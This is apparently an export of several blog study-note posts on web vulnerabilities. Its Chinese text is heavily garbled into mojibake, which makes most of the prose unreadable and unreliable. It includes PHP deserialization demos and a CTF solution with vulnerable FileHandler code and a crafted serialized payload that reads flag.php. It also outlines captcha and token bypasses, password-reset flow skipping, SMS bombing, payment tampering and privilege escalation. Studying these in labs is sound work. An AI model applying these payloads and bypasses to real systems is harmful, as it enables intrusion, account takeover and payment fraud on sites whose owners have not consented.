//å…¶ä¸­sä»£è¡¨çš„æ˜¯æ•°æ®ç±»å‹,4ä»£è¡¨çš„æ˜¯æ•°æ®é•¿åº¦ï¼Œ&quot;zpzp&quot;ä»£è¡¨æ•°æ®å†…å®¹i:123; //åŒç†,iä»£è¡¨çš„æ˜¯int,ä¸è¿‡intç±»å‹æ²¡æœ‰é•¿åº¦ ååºåˆ—åŒ–å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡çš„è¿‡ç¨‹ç§°ä¸ºååºåˆ—åŒ– 123456&lt;?php$key = &#x27;s:5:&quot;hello&quot;;&#x27;;echo unserialize($key); //å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯¹è±¡?&gt; &gt;&gt;&gt;&gt;hello æœ‰ç±»1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass ABC&#123; public $test; function __construct()&#123; //å¯¹è±¡è¢«åˆ›å»ºæ—¶è§¦å‘ $test =1; echo &#x27;è°ƒç”¨äº†æ„é€ å‡½æ•°&lt;br&gt;&#x27;; &#125; function __destruct()&#123; //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘ echo &#x27;è°ƒç”¨äº†ææ„å‡½æ•°&lt;br&gt;&#x27;; &#125; function __wakeup()&#123; //è°ƒç”¨unserializeå‡½æ•°æ—¶è§¦å‘ echo &#x27;è°ƒç”¨äº†è‹é†’å‡½æ•°&lt;br&gt;&#x27;; &#125;&#125;echo &#x27;åˆ›å»ºå¯¹è±¡ a&lt;br&gt;&#x27;;$a = new ABC;echo &#x27;åºåˆ—åŒ–&lt;br&gt;&#x27;;$a_ser=serialize($a);echo $a_ser;echo &quot;&lt;br/&gt;&quot;;echo &#x27;ååºåˆ—åŒ–&lt;br/&gt;&#x27;;$a_unser = unserialize($a_ser);echo &#x27;å¯¹è±¡å¿«è¦æ­»äº†ï¼&#x27;;?&gt; &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;åˆ›å»ºå¯¹è±¡ aè°ƒç”¨äº†æ„é€ å‡½æ•°åºåˆ—åŒ–O:3:&quot;ABC&quot;:1:&#123;s:4:&quot;test&quot;;N;&#125;ååºåˆ—åŒ–è°ƒç”¨äº†è‹é†’å‡½æ•°å¯¹è±¡å¿«è¦æ­»äº†ï¼è°ƒç”¨äº†ææ„å‡½æ•°è°ƒç”¨äº†ææ„å‡½æ•° å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬åˆ›å»ºäº†å¯¹è±¡aæ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨äº†__constructå‡½æ•°ï¼Œç„¶åå½“æˆ‘ä»¬è°ƒç”¨ååºåˆ—åŒ–å‡½æ•°unserializeè‡ªåŠ¨è°ƒç”¨äº†__wakeupå‡½æ•°ï¼Œå½“ç¨‹åºç»“æŸçš„æ—¶å€™è‡ªåŠ¨è°ƒç”¨äº†__destructå‡½æ•°ã€‚è¿™å°±æ˜¯ç±»ä¸­é­”æœ¯æ–¹æ³•çš„è§¦å‘æ¡ä»¶ã€‚å½“ç„¶è¿™é‡Œæ²¡æœ‰ä¸¾ä¾‹å‡ºè°ƒç”¨serializeæ—¶è§¦å‘çš„é­”æœ¯å‡½æ•°ï¼Œå®ƒæ˜¯__sleepå‡½æ•°ã€‚ æ¼”ç¤ºæ¡ˆä¾‹å…ˆæä¸€æŠŠ PHP ååºåˆ—åŒ–çƒ­èº«é¢˜ç¨³ä½-æ— ç±»é—®é¢˜-æœ¬åœ°test.phpæ–‡ä»¶å†…å®¹ï¼š 12345678910&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$KEY = &quot;xiaodi&quot;;$str = $_GET[&#x27;str&#x27;];if (unserialize($str) === &quot;$KEY&quot;)&#123;echo &quot;$flag&quot;;&#125;show_source(__FILE__); flag.phpæ–‡ä»¶å†…å®¹: 123&lt;?php$flag=&quot;&#123;abcdefghigjl&#125;&quot;;?&gt; URLï¼š 1http://127.0.0.1/xlh/test.php?str=s:6:&quot;xiaodi&quot;; æœ€åé¡¶ä¸€æŠŠç½‘é¼æ¯ 2020 é’é¾™å¤§çœŸé¢˜èˆ’æœä¸‹-æœ‰ç±»é­”æœ¯æ–¹æ³•è§¦å‘-å®ä¾‹æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include(&quot;flag.php&quot;); highlight_file(__FILE__); class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125; &#125; function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125; if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125; &#125; æŸ¥çœ‹ä»£ç å¯ä»¥çœ‹å‡ºæ¥ï¼ŒGETæ–¹å¼ä¼ å…¥åºåˆ—åŒ–çš„strå­—ç¬¦ä¸²ï¼Œstrå­—ç¬¦ä¸²ä¸­æ¯ä¸€ä¸ªå­—ç¬¦çš„ASCIIèŒƒå›´åœ¨32åˆ°125ä¹‹é—´ï¼Œç„¶åå¯¹å…¶ååºåˆ—åŒ–ã€‚å½“æ‰§è¡Œunserializeå‡½æ•°æ—¶ï¼Œä¼šè°ƒç”¨__destructå‡½æ•°ã€‚ 123456function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process();&#125; è¿™é‡Œ===ä»£è¡¨å¼ºç±»å‹æ¯”è¾ƒï¼Œéœ€è¦æ•°å€¼å’Œç±»å‹éƒ½ç›¸ç­‰æ‰æ˜¯ç›¸ç­‰ã€‚æ‰€æœ‰å¦‚æœæˆ‘ä»¬è¿™é‡Œè¾“å…¥2æˆ–è€…â€™ 2â€™éƒ½å¯ä»¥ç»•è¿‡ã€‚ç»•è¿‡ä»¥åå°±ä¼šè¿›å…¥process()å‡½æ•°ã€‚ 12345678910public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125;&#125; åœ¨processå‡½æ•°ä¸­ï¼Œop==â€2â€æ˜¯å¼±ç±»å‹æ¯”è¾ƒ==ï¼Œæ•°å€¼ç›¸ç­‰å°±æ˜¯æƒ³ç›¸ç­‰ï¼Œæ‰€æœ‰æˆ‘ä»¬ä¹‹å‰çš„è¾“å…¥å’Œè¿™é‡Œæ˜¯ç›¸ç­‰çš„ï¼Œç„¶åå°±ä¼šæ‰§è¡Œreadå‡½æ•°ã€‚ 1234567private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res;&#125; readå‡½æ•°ä¼šæ ¹æ®filenameè¯»å–æ–‡ä»¶ã€‚ç„¶åæ‰§è¡Œoutputå‡½æ•°å°†è¯»åˆ°çš„å†…å®¹è¿›è¡Œè¾“å‡ºã€‚ æ•´ä¸ªåˆ©ç”¨æ€è·¯å°±å¾ˆæ˜æ˜¾äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œ$op,$filename,$contentä¸‰ä¸ªå˜é‡æƒé™éƒ½æ˜¯protectedï¼Œè€Œprotectedæƒé™çš„å˜é‡åœ¨åºåˆ—åŒ–çš„æ—¶ä¼šæœ‰%00*%00å­—ç¬¦ï¼Œ%00å­—ç¬¦çš„ASCIIç ä¸º0ï¼Œå°±æ— æ³•é€šè¿‡ä¸Šé¢çš„is_validå‡½æ•°æ ¡éªŒã€‚ è¿™é‡Œç»•è¿‡æ–¹æ³•å°±æ˜¯ä¿®æ”¹ç†Ÿæ‚‰ä¸ºpublicï¼Œphp7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡å³å¯ æ‰€ä»¥æœ€åæˆ‘ä»¬çš„ä»£ç æ˜¯ 12345678910&lt;?phpclass FileHandler&#123; public $op=&#x27; 2&#x27;;//æºç å‘Šè¯‰æˆ‘ä»¬ op ä¸º 1 æ—¶å€™æ˜¯æ‰§è¡Œå†™å…¥ä¸º 2 æ—¶æ‰§è¡Œè¯» public $filename=&quot;flag.php&quot;;//æ–‡ä»¶å¼€å¤´è°ƒç”¨çš„æ˜¯ flag.php public $content=&quot;xd&quot;; //éšä¾¿å†™çš„ï¼Œå› ä¸ºè¦ä¸‰ä¸ªå‚æ•°&#125;$flag = new FileHandler();$flag_1 = serialize($flag);echo $flag_1;?&gt; è¿™é‡Œåºåˆ—åŒ–ä¸€ä¸‹æ˜¯ï¼šæ‰€ä»¥æœ€åçš„ç»“æœå°±æ˜¯è¿™ä¸ª 1O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:2:&quot;xd&quot;;&#125; æ¶‰åŠèµ„æºï¼š http://www.dooccn.com/php/ https://www.ctfhub.com/#/challenge https://ctf.bugku.com/challenges#flag.php https://cgctf.nuptsast.com/challenges#Web https://www.cnblogs.com/20175211lyz/p/11403397.html","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"PHPååºåˆ—åŒ–","slug":"PHPååºåˆ—åŒ–","permalink":"https://al0nez.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"36WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹éªŒè¯ç ä¸TokenåŠæ¥å£","slug":"36WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹éªŒè¯ç ä¸TokenåŠæ¥å£","date":"2021-09-21T02:36:48.000Z","updated":"2021-09-21T05:59:36.705Z","comments":true,"path":"2021/09/21/36WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹éªŒè¯ç ä¸TokenåŠæ¥å£/","link":"","permalink":"https://al0nez.github.io/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† éªŒè¯å®‰å…¨ éªŒè¯ç å®‰å…¨åˆ†ç±» å›¾ç‰‡ï¼Œæ‰‹æœºæˆ–é‚®ç®±ï¼Œè¯­éŸ³ï¼Œè§†é¢‘ï¼Œæ“ä½œç­‰ åŸç† éªŒè¯ç”Ÿæˆæˆ–éªŒè¯è¿‡ç¨‹ä¸­çš„é€»è¾‘é—®é¢˜ å±å®³ è´¦æˆ·æƒé™æ³„æ¼ï¼ŒçŸ­ä¿¡è½°ç‚¸ï¼Œéå†ï¼Œä»»æ„ç”¨æˆ·æ“ä½œç­‰ æ¼æ´ å®¢æˆ·ç«¯å›æ˜¾ï¼ŒéªŒè¯ç å¤ç”¨ï¼ŒéªŒè¯ç çˆ†ç ´ï¼Œç»•è¿‡ç­‰ éªŒè¯ç è¯†åˆ«æ’ä»¶å·¥å…·ä½¿ç”¨ Pkav_Http_Fuzz(ä¸å¥½ç”¨) captcha-killerï¼ˆburpæ’ä»¶ï¼‰ reCAPTCHA 1https://www.cnblogs.com/cwkiller/p/12659549.html æœåŠ¡ç«¯éªŒè¯ ç¬¬ä¸€æ¬¡è¾“å…¥æ­£ç¡®çš„éªŒè¯ç ï¼Œä¹‹åä½¿ç”¨åŒæ ·çš„éªŒè¯ç è¿›è¡Œå‘åŒ…ï¼Œä»è€ŒæˆåŠŸç»•è¿‡ã€‚è¿™æ˜¯å› ä¸ºæœåŠ¡å™¨åœ¨åˆ¤æ–­çš„æ—¶å€™ï¼Œåªæ˜¯å°†ç¬¬ä¸€æ¬¡è¿›è¡ŒéªŒè¯ï¼Œç„¶åç”Ÿæˆä¸€ä¸ªsessionï¼ŒéªŒè¯ç»“æŸåæ²¡æœ‰åˆ é™¤sessionï¼Œå¯¼è‡´ä¹‹åå¯ä»¥ä¸€ç›´ä½¿ç”¨è¯¥éªŒè¯ç è¿›è¡ŒéªŒè¯ã€‚ å®¢æˆ·ç«¯éªŒè¯ é€šè¿‡è°ƒç”¨JSä»£ç è¿›è¡ŒéªŒè¯ç çš„éªŒè¯å·¥ä½œã€‚å¯ä»¥æŸ¥çœ‹å‰ç«¯JSä»£ç ï¼Œæˆ–è€…networkä¸­åŠ è½½çš„JSæ–‡ä»¶æ¥ç¡®å®šæ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯ã€‚ token å®‰å…¨åŸç† Tokenæ˜¯æœåŠ¡ç«¯ç”Ÿæˆçš„ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œä»¥ä½œå®¢æˆ·ç«¯è¿›è¡Œè¯·æ±‚çš„ä¸€ä¸ªä»¤ç‰Œï¼Œå½“ç¬¬ä¸€æ¬¡ç™»å½•åï¼ŒæœåŠ¡å™¨ç”Ÿæˆä¸€ä¸ªTokenä¾¿å°†æ­¤Tokenè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä»¥åå®¢æˆ·ç«¯åªéœ€å¸¦ä¸Šè¿™ä¸ªTokenå‰æ¥è¯·æ±‚æ•°æ®å³å¯ï¼Œæ— éœ€å†æ¬¡å¸¦ä¸Šç”¨æˆ·åå’Œå¯†ç ã€‚ token å®¢æˆ·ç«¯å›æ˜¾ tokenåœ¨å‰ç«¯æœ‰å›æ˜¾ï¼Œå¯ä»¥è·å–åˆ° 1https://blog.csdn.net/weixin_44110913/article/details/109368455 tokenæ— å›æ˜¾ çœ‹çœ‹æ˜¯å¦æœ‰è§„å¾‹ï¼Œæ˜¯å¦å¯ä»¥çˆ†ç ´ï¼Œä¸€èˆ¬éƒ½ä¸è¡Œ æ¥å£å®‰å…¨é—®é¢˜è°ƒç”¨ï¼Œéå†ï¼Œæœªæˆæƒï¼Œç¯¡æ”¹ç­‰ è°ƒç”¨æ¡ˆä¾‹ï¼šçŸ­ä¿¡è½°ç‚¸ éå†æ¡ˆåˆ—ï¼šUID ç­‰éå† callback å›è°ƒ JSONP æœªæˆæƒè®¿é—®ï¼šä¸è¶Šæƒæ¼æ´åŒºåˆ« Jboss æœªæˆæƒè®¿é—® Jenkins æœªæˆæƒè®¿é—® ldap æœªæˆæƒè®¿é—® Redis æœªæˆæƒè®¿é—® elasticsearch æœªæˆæƒè®¿é—® MenCache æœªæˆæƒè®¿é—® Mongodb æœªæˆæƒè®¿é—® Rsync æœªæˆæƒè®¿é—® Zookeeper æœªæˆæƒè®¿é—® Docker æœªæˆæƒè®¿é—® æ¶‰åŠèµ„æºï¼š https://www.lanzous.com/i1z2s3e https://www.cnblogs.com/nul1/p/12071115.html https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2 https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"é€»è¾‘è¶Šæƒ","slug":"é€»è¾‘è¶Šæƒ","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"35WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ‰¾å›æœºåˆ¶åŠæ¥å£çˆ†ç ´","slug":"35WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ‰¾å›æœºåˆ¶åŠæ¥å£çˆ†ç ´","date":"2021-09-21T02:36:28.000Z","updated":"2021-09-21T06:00:10.675Z","comments":true,"path":"2021/09/21/35WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ‰¾å›æœºåˆ¶åŠæ¥å£çˆ†ç ´/","link":"","permalink":"https://al0nez.github.io/2021/09/21/35WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%8E%A5%E5%8F%A3%E7%88%86%E7%A0%B4/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† æ‰¾å›é‡ç½®æœºåˆ¶å®¢æˆ·ç«¯å›æ˜¾ç‚¹å‡»è·å–éªŒè¯ç åï¼Œä¼šåœ¨æ•°æ®åŒ…ä¸­å›æ˜¾éªŒè¯ç å†…å®¹ï¼Œè€Œä¸éœ€è¦å»æ¥æ”¶æ‰‹æœºæˆ–è€…é‚®ç®±çš„éªŒè¯ç ï¼Œè¿™ç§ç§°ä¸ºå®¢æˆ·ç«¯å›æ˜¾ã€‚ Response çŠ¶æ€å€¼å½“æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸ªéªŒè¯ç ï¼Œå‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯çš„æ ‡å¿—æ¥å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå¦‚æœæˆ‘ä»¬å°†è¿”å›çš„æ•°æ®åŒ…è¿›è¡Œæ‹¦æˆªï¼Œé‚£ä¹ˆå¦‚æœå®¢æˆ·ç«¯éªŒè¯çš„è¿™ä¸ªç»“æœä¸æ˜¯ä¾æ®æœåŠ¡å™¨çš„è¯ï¼Œå°±ä¼šæˆåŠŸéªŒè¯ã€‚ éªŒè¯ç çˆ†ç ´å½“éªŒè¯ç é•¿åº¦è¾ƒçŸ­çš„æ—¶å€™ï¼Œæ¯”å¦‚è¯´4ä½æ•°å­—ï¼Œå°±å¯ä»¥ä½¿ç”¨çˆ†ç ´å·¥å…·è¿›è¡ŒéªŒè¯ç çˆ†ç ´ æ‰¾å›æµç¨‹ç»•è¿‡ä¸€èˆ¬æˆ‘ä»¬åœ¨æ‰¾å›å¯†ç æ—¶ï¼Œç¬¬ä¸€æ­¥ä¼šå…ˆéªŒè¯æ‰‹æœºçš„éªŒè¯ç ï¼Œç¬¬ä¸€æ­¥é€šè¿‡åï¼Œç¬¬äºŒæ­¥ä¼šè¿›è¡Œä¿®æ”¹å¯†ç ã€‚æˆ‘ä»¬æŠ“å–ç¬¬äºŒæ­¥ä¿®æ”¹å¯†ç çš„æ•°æ®åŒ…ï¼Œå½“æˆ‘ä»¬éšæœºä¿®æ”¹ä¸€ä¸ªè´¦å·çš„å¯†ç æ—¶ï¼Œç›´æ¥å°†ç¬¬äºŒæ­¥çš„æ•°æ®åŒ…å¤åˆ¶ä¸Šå»ï¼Œå°±å¯ä»¥ç»•è¿‡ç¬¬ä¸€æ­¥éªŒè¯æµç¨‹ã€‚ æ¥å£è°ƒç”¨ä¹±ç”¨çŸ­ä¿¡è½°ç‚¸ï¼Œæ¥ç”µè½°ç‚¸ç­‰ æ¶‰åŠèµ„æºï¼š http://downcode.com/downcode/j_16621.shtml https://pan.baidu.com/s/1P73QFmEhY6f350CvmnOJNg æå–ç ï¼šxiao https://pan.baidu.com/s/1N963jFjTefNc6Gnso-RHmw æå–ç ï¼šxiao https://www.mozhe.cn/bug/detail/K2sxTTVYaWNncUE1cTdyNXIyTklHdz09bW96aGUmozhe","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"é€»è¾‘è¶Šæƒ","slug":"é€»è¾‘è¶Šæƒ","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"34WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ”¯ä»˜æ•°æ®ç¯¡æ”¹å®‰å…¨","slug":"34WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ”¯ä»˜æ•°æ®ç¯¡æ”¹å®‰å…¨","date":"2021-09-21T02:36:10.000Z","updated":"2021-09-21T06:00:15.667Z","comments":true,"path":"2021/09/21/34WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ”¯ä»˜æ•°æ®ç¯¡æ”¹å®‰å…¨/","link":"","permalink":"https://al0nez.github.io/2021/09/21/34WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%94%AF%E4%BB%98%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E5%AE%89%E5%85%A8/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† ç™»å½•åº”ç”¨åŠŸèƒ½ç‚¹å®‰å…¨é—®é¢˜æ£€æµ‹ å­˜åœ¨ç™»å½•åŠŸèƒ½çš„ä½ç½® å±å®³ ä¸ç”¨è´¦å·å¯†ç ï¼Œç›´æ¥ç™»å½• ç™»å½•ç‚¹æš´åŠ›ç ´è§£å¦‚æœæ•°æ®åŒ…ä¼ è¾“çš„è´¦å·å¯†ç æ²¡æœ‰åŠ å¯†æˆ–åŠ å¯†æ–¹å¼å·²çŸ¥ï¼Œå¯ä»¥å°è¯•æš´åŠ›ç ´è§£ HTTP/HTTPS ä¼ è¾“HTTPæ˜¯æ˜æ–‡ä¼ è¾“çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åœ¨è¿›è¡Œå¯†ç ç™»å½•çš„æ—¶å€™ï¼Œè´¦å·å’Œå¯†ç æ˜¯æ²¡æœ‰åŠ å¯†çš„ã€‚è¿™ç§æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œçˆ†ç ´çš„ã€‚ è€ŒHTTPSåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ˜¯è¿›è¡ŒåŠ å¯†çš„ï¼Œåœ¨è¿›è¡Œç™»å½•çš„æ—¶å€™å¦‚æœæˆ‘ä»¬æ— æ³•å¾—çŸ¥ä»–çš„åŠ å¯†å½¢å¼ï¼Œæ˜¯æ— æ³•çˆ†ç ´çš„ï¼Œå½“ç„¶æœ‰çš„æ—¶å€™ä¹Ÿæ²¡æœ‰åŠ å¯†ï¼Œå…·ä½“æƒ…å†µå¯ä»¥ç¢°åˆ°äº†çœ‹ä¸€ä¸‹æ•°æ®åŒ…ã€‚ Cookie è„†å¼±ç‚¹éªŒè¯ä»£ç å®¡è®¡ çœ‹çœ‹Cookieæœ‰æ— å¯æ“ä½œçš„å€¼ï¼Œè°ƒæ•´é‚£äº›è·Ÿä½ ç™»å½•é¡µé¢æœ‰å…³çš„é¡¹ï¼Œçœ‹æ˜¯å¦ä¼šå½±å“åŠŸèƒ½ã€‚å¦‚ä¿®æ”¹â€œuserâ€çš„å€¼ Session å›ºå®šç‚¹æµ‹è¯•éªŒè¯å¯†æ–‡æ¯”å¯¹å®‰å…¨æµ‹è¯•æ•°æ®ç¯¡æ”¹å®‰å…¨é—®é¢˜æŒ–æ´æŠ€å·§ï¼šæ”¯ä»˜æ¼æ´ä¹‹æ€»ç»“1https://www.secpulse.com/archives/67080.html å•†å“è´­ä¹°æµç¨‹ï¼šé€‰æ‹©å•†å“å’Œæ•°é‡-é€‰æ‹©æ”¯ä»˜åŠé…é€æ–¹å¼-ç”Ÿæˆè®¢å•ç¼–å·-è®¢å•æ”¯ä»˜é€‰æ‹©-å®Œæˆæ”¯ä»˜ å¸¸è§ç¯¡æ”¹å‚æ•°ï¼šå•†å“ç¼–å· IDï¼Œè´­ä¹°ä»·æ ¼ï¼Œè´­ä¹°æ•°é‡ï¼Œæ”¯ä»˜æ–¹å¼ï¼Œè®¢å•å·ï¼Œæ”¯ä»˜çŠ¶æ€ç­‰ å¸¸è§ä¿®æ”¹æ–¹æ³•ï¼šæ›¿æ¢æ”¯ä»˜ï¼Œé‡å¤æ”¯ä»˜ï¼Œæœ€å°é¢æ”¯ä»˜ï¼Œè´Ÿæ•°æ”¯ä»˜ï¼Œæº¢å‡ºæ”¯ä»˜ï¼Œä¼˜æƒ åˆ¸æ”¯ä»˜ç­‰ æ¶‰åŠèµ„æº https://www.zblogcn.com/zblogphp/ https://github.com/huyuanzhi2/password_brute_dictionary https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg æå–ç ï¼šxiao https://pan.baidu.com/s/1fJaW23UdcXcSFigX0-Duwg æå–ç ï¼šxiao","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"é€»è¾‘è¶Šæƒ","slug":"é€»è¾‘è¶Šæƒ","permalink":"https://al0nez.github.io/tags/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/"}]},{"title":"33WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ°´å¹³å‚ç›´è¶Šæƒå…¨è§£","slug":"33WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ°´å¹³å‚ç›´è¶Šæƒå…¨è§£","date":"2021-09-21T02:35:56.000Z","updated":"2021-09-21T06:00:21.295Z","comments":true,"path":"2021/09/21/33WEBæ¼æ´-é€»è¾‘è¶Šæƒä¹‹æ°´å¹³å‚ç›´è¶Šæƒå…¨è§£/","link":"","permalink":"https://al0nez.github.io/2021/09/21/33WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%E5%85%A8%E8%A7%A3/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† è¶Šæƒ æ°´å¹³è¶ŠæƒåŸç† é€šè¿‡æ›´æ¢çš„æŸä¸ª ID ä¹‹ç±»çš„èº«ä»½æ ‡è¯†ï¼Œä»è€Œä½¿ A è´¦å·è·å–ï¼ˆä¿®æ”¹ã€åˆ é™¤ç­‰ï¼‰B è´¦å·æ•°æ®ã€‚ å‚ç›´è¶ŠæƒåŸç† ä½¿ç”¨ä½æƒé™èº«ä»½çš„è´¦å·ï¼Œå‘é€é«˜æƒé™è´¦å·æ‰èƒ½æœ‰çš„è¯·æ±‚ï¼Œè·å¾—å…¶é«˜æƒé™çš„æ“ä½œã€‚ æœªæˆæƒè®¿é—®åŸç† é€šè¿‡åˆ é™¤è¯·æ±‚ä¸­çš„è®¤è¯ä¿¡æ¯åé‡æ”¾è¯¥è¯·æ±‚ï¼Œä¾æ—§å¯ä»¥è®¿é—®æˆ–è€…å®Œæˆæ“ä½œã€‚ 